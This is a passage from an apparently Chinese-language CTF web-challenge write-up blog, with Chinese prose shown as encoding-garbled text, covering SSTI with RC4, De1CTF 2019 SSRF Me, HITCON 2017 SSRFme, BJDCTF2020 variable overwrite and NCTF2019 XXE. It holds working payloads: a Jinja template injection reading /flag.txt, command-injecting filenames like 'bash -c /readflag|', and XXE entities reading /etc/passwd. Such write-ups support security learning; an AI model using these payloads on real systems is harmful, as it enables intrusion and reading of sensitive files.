å¯†ç¨‹åºæˆåŠŸã€‚&quot;)</span></span><br><span class="line">  res = []</span><br><span class="line">  i = j = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">â€‹    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">â€‹    j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">â€‹    box[i], box[j] = box[j], box[i]</span><br><span class="line">â€‹    t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">â€‹    k = box[t]</span><br><span class="line">â€‹    res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">  cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot;</span> %quote(cipher))</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">  <span class="comment">#HereIsTreasureæ˜¯ç§˜é’¥</span></span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h4 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h4><p>é¢˜ç›®ç»™å‡ºæºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Taskç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):<span class="comment">#åˆå§‹åŒ–</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):<span class="comment">#é€šè¿‡checkSignæ–¹æ³•æ£€æµ‹ç™»å½•</span></span><br><span class="line">			<span class="comment">#&quot;scan&quot;&quot;read&quot;éƒ½è¦å­˜åœ¨äºactionä¸­ï¼Œæ‰èƒ½æ‰§è¡Œä»¥ä¸‹ä¸¤æ¡if</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):<span class="comment">#å½“æˆ‘ä»¬ä¼ å…¥çš„actionå’Œparamç»è¿‡getSign()å‡½æ•°åå’Œsignç›¸ç­‰å³å¯è¿”å›true</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#/geneSignè·¯ç”±å¯ä»¥ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„md5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))<span class="comment">#getä¼ å‚param</span></span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)<span class="comment">#è°ƒç”¨getSign()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#/De1taè·¯ç”±</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))<span class="comment">#cookiesä¼ å‚action</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))<span class="comment">#getä¼ å‚param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))<span class="comment">#cookiesä¼ å‚sign</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)<span class="comment">#ç”¨æˆ‘ä»¬ä¼ ä¸Šå»çš„action,param,signå‚æ•°åŠipæ„é€ Taskç±»å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())<span class="comment">#æ‰§è¡ŒTaskç±»å¯¹è±¡çš„Exec</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):<span class="comment">#secert_key + param + actionæ‹¼æ¥å†md5</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):<span class="comment">#wafç¦ç”¨gopherå’Œfileåè®®</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æç¤ºflagåœ¨.&#x2F;flag.txtä¸­</p>
<p>è¶…è¯¦ç»†wpï¼š[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13685940.html">De1CTF 2019]SSRF Me - My_Dreams - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ä¸å¦¨å‡è®¾ secert_key æ˜¯ xxx ï¼Œé‚£ä¹ˆåœ¨å¼€å§‹è®¿é—® &#x2F;geneSign?param&#x3D;flag.txt çš„æ—¶å€™ï¼Œè¿”å›çš„ md5 å°±æ˜¯ md5(â€˜xxxâ€™ + â€˜flag.txtâ€™ + â€˜scanâ€™) ï¼Œåœ¨ python é‡Œé¢ä¸Šè¿°è¡¨è¾¾å¼å°±ç›¸å½“äº md5(xxxflag.txtscan) ï¼Œè¿™å°±å¾ˆæœ‰æ„æ€äº†ã€‚</p>
<p>ç›´æ¥æ„é€ è®¿é—® &#x2F;geneSign?param&#x3D;flag.txtread ï¼Œæ‹¿åˆ°çš„ md5 å°±æ˜¯ md5(â€˜xxxâ€™ + â€˜flag.txtreadâ€™ + â€˜scanâ€™) ï¼Œç­‰ä»·äº md5(â€˜xxxflag.txtreadscanâ€™) ï¼Œè¿™å°±è¾¾åˆ°äº†ç›®æ ‡ã€‚</p>
<p>ç›´æ¥è®¿é—® &#x2F;De1ta?param&#x3D;flag.txt æ„é€  Cookie: sign&#x3D;7a2a235fcc9218dfe21e4eb400a11b5e;action&#x3D;readscan</p>
<hr>
<h4 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h4><p>[perlè„šæœ¬ä¸­GETå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆ<a target="_blank" rel="noopener" href="https://www.codenong.com/cs105868449/">HITCON 2017]SSRFmeï¼‰ | ç å†œå®¶å›­ (codenong.com)</a></p>
<p>[åˆ·é¢˜<a target="_blank" rel="noopener" href="https://www.cnblogs.com/karsa/p/14111891.html">HITCON 2017]SSRFme - kar3a - åšå®¢å›­ (cnblogs.com)</a></p>
<p>è¿™é“é¢˜çš„è€ƒç‚¹æ˜¯ <code>GET</code> è¿™ä¸ªå‘½ä»¤çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¸»è¦æ˜¯ perl çš„ featureï¼Œåœ¨ open å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<p><img src="/images/ssrfme.png" alt="ssrfme.png"></p>
<p>é¦–å…ˆå®ƒä¼šè¿›å…¥sandbox&#x2F;æ–‡ä»¶å¤¹ç„¶åè¿›å…¥ä¸€ä¸ª æŠŠ â€œorange118.239.16.215â€ md5æ‘˜è¦å‘½åçš„æ–‡ä»¶å¤¹ã€‚å†ç„¶åæ‰§è¡Œä¸€ä¸ªâ€œGET +æˆ‘ä»¬ä¼ å…¥çš„urlå‚æ•°â€ è¿™ä¸ªå‘½ä»¤ã€‚æœ€åæŠŠæ‰§è¡Œçš„å‘½ä»¤å†™å…¥æˆ‘ä»¬ä¼ å…¥ä»¥æˆ‘ä»¬ä¼ å…¥çš„filenameä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å†…ã€‚<br>â€ƒäº†è§£äº†åŸºæœ¬æµç¨‹å’Œä¸Šé¢è¯´çš„æ¼æ´åï¼Œæˆ‘çš„æ€è·¯æ˜¯ï¼š</p>
<ol>
<li><p>å…ˆåˆ›å»ºä¸€ä¸ªä»¥æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶</p>
</li>
<li><p>ç„¶åæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤</p>
</li>
<li><p>æŸ¥çœ‹æˆ‘ä»¬åˆ›å»ºçš„æ–‡ä»¶</p>
</li>
<li><p>ä½¿ç”¨2æ¬¡<code>?url=file:ls /|&amp;filename=ls /|</code> ç¬¬ä¸€æ¬¡æ˜¯ä¸ºäº†åˆ›å»º<code>ls /|</code> æ–‡ä»¶ç¬¬äºŒæ¬¡å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶æŠŠç»“æœå†™å…¥æ–‡ä»¶äº†ã€‚</p>
</li>
<li><p>è®¿é—®æ–‡ä»¶ï¼Œå…ˆå°†<code>orange118.239.16.215</code>md5ç„¶åå°±å¯ä»¥çŸ¥é“æ–‡ä»¶è·¯å¾„äº†æ‰§è¡Œ<code>/sandbox/b637d38ae20fabeb50aa7ca03ba02081/ls /|</code> å¯ä»¥çœ‹åˆ°æœ‰ä¸ª <code>readflag</code>,é‚£ä¹ˆå°±å°è¯•è¿è¡Œå®ƒå§ã€‚</p>
</li>
<li><p>è€æ ·å­æ‰§è¡Œ2é<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></p>
</li>
<li><p>æ¥ç€å»è®¿é—®<code>/sandbox/b637d38ae20fabeb50aa7ca03ba02081/bash -c /readflag|</code> å³å¯ä»¥å¾—åˆ°æˆ‘ä»¬çš„flagã€‚</p>
</li>
</ol>
<p><code>bash -c</code>å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/images/ssrfme2.png" alt="ssrfme2.png"></p>
<hr>
<h1 id="GITæ³„éœ²"><a href="#GITæ³„éœ²" class="headerlink" title="GITæ³„éœ²"></a>GITæ³„éœ²</h1><h4 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h4><p>dirsearchæ‰«åˆ°git æ³„éœ²ã€‚</p>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>å‰ä¸¤ä¸ªforeachè¯­å¥åˆ†åˆ«å°†POSTå‚æ•°å’ŒGETå‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œæ¥ç€æ˜¯ä¸‰ä¸ªifè¯­å¥ï¼Œexit()å‡½æ•°é€€å‡ºè„šæœ¬çš„åŒæ—¶è¾“å‡ºå˜é‡ï¼Œæœ€åä¸€å¥æ˜¯è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„flagã€‚<br>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯è®©è„šæœ¬æ‰§è¡Œåˆ°æœ€åä¸€å¥<code>echo $flag</code>;ï¼Œä½†å³ä½¿ç»•è¿‡ä¸‰ä¸ªifè¯­å¥ï¼Œæˆ‘ä»¬GETä¼ å‚æˆ–è€…POSTä¼ å‚çš„flagæ€»ä¼šè¢«å˜é‡è¦†ç›–ï¼šå¦‚æˆ‘ä»¬GETä¼ å‚<code>flag=aaa</code>ï¼Œåœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­å˜æˆ<code>$flag = $aaa</code>ï¼Œè€Œ<code>$aaa</code>å˜é‡æ²¡æœ‰å®šä¹‰ä¸ºç©ºï¼Œæœ€åçš„è¾“å‡ºå°±æ˜¯ç©ºåŒç†ï¼šæˆ‘ä»¬POSTä¼ å‚flag&#x3D;aaaï¼Œåœ¨ç¬¬ä¸€ä¸ªforeachè¯­å¥ä¸­å˜æˆ<code>$flag= aaa</code>ï¼Œflagè¢«è¦†ç›–ä¸ºâ€˜aaaâ€™ï¼Œæœ€åè¾“å‡ºaaa<br>ç”±æ­¤çœ‹æ¥ï¼Œè¿™æ ·è¡Œä¸é€šï¼Œå›è¿‡å¤´æ¥å‰é¢è¯´åˆ°ifè¯­å¥ä¸­çš„exit()å‡½æ•°è™½ç„¶ä¼šé€€å‡ºæ‰§è¡Œï¼Œä½†ä¹Ÿä¼šè¾“å‡ºå…¶å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–å°†<code>exit()</code>å‡½æ•°å†…çš„å‚æ•°ç”¨<code>$flag</code>è¦†ç›–æ‰å°±èƒ½è¾“å‡ºflagäº†ï¼›<br>æ€è·¯ç†æ¸…äº†ï¼Œè¿™é‡Œé¢æœ‰ä¸‰ä¸ªifè¯­å¥ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªèƒ½åˆ©ç”¨å˜é‡è¦†ç›–è¾“å‡ºflag,ä¹Ÿå°±æ˜¯è¯´æœ‰ä¸¤ç§æ–¹æ³•<br>ä¸€æ˜¯ç¬¬äºŒä¸ªifè¯­å¥ä¸­å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è¾“å‡ºçš„<code>$yds</code>å˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦é€šè¿‡å˜é‡è¦†ç›–è¾¾åˆ°<code>$yds=$flag</code>çš„æ•ˆæœï¼ŒGETä¼ å‚<code>yds=flag</code>ï¼Œåœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­ï¼Œé¦–å…ˆæ˜¯<code>$x=yds</code>ï¼Œ<code>$y=flag</code>ï¼Œç»è¿‡<code>$$x = $$y</code>ä¹Ÿå°±å˜æˆäº†<code>$yds=$flag</code></p>
<p>äºŒæ˜¯ç¬¬ä¸‰ä¸ªifè¯­å¥ä¸­è¾“å‡ºå˜é‡<code>$is</code>ï¼Œåˆ¤æ–­æ¡ä»¶ä¸º<code>$_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;</code>ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡æ»¡è¶³åé¢è¿™ä¸ªæ¡ä»¶è¿›è¡Œå˜é‡è¦†ç›–ï¼šGETä¼ å‚is&#x3D;flag&amp;flag&#x3D;flagï¼›åœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­ï¼Œé¦–å…ˆæ˜¯<code>$x=is</code>,<code>$y=flag</code>,å¸¦è¿›å»å°±å˜æˆäº†<code>$is=$flag</code>ï¼Œè¿™å°±è¾¾åˆ°äº†è¦†ç›–çš„ç›®çš„ï¼Œè€Œå‚æ•°ä¸­flag&#x3D;flagåªæ˜¯ä¸ºäº†æ»¡è¶³ifè¯­å¥</p>
<hr>
<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h4><p>å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">https://www.freebuf.com/vuls/175451.html</a></p>
<p>xeeå¤–éƒ¨å®ä½“ï¼Œæ„é€ æ¶æ„å®ä½“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>è¯»å–flag</p>
<hr>
